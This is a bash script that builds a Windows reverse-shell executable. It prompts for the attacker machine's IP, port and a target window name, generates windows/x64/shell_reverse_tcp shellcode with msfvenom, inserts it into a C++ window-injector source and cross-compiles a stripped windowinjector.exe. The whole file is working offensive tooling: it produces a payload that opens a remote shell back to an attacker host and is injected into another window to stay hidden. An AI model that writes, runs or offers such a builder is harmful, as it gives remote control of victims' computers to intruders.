#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

echo -e "${YELLOW}\n[+] Create Windows Reverse Shell \nProvide the following information about YOUR attacker machine${ENDCOLOR}\n"
printf "IP = " 
read -r ip
printf "PORT = "
read -r port
printf "Window Name to Inject Shell = "
read -r windowname


echo $windowname > code/windowname.txt
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port  -f c -o code/WindowInjector/code/shellcode.c >/dev/null
cp code/WindowInjector/src/windowinjector.cpp code/WindowInjector/src/windowinjector2.cpp 2>/dev/null
python3 code/WindowInjector/src/copyshellcode.py

x86_64-w64-mingw32-g++ code/WindowInjector/src/windowinjector2.cpp  -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -o windowinjector.exe -fpermissive 2</dev/null
        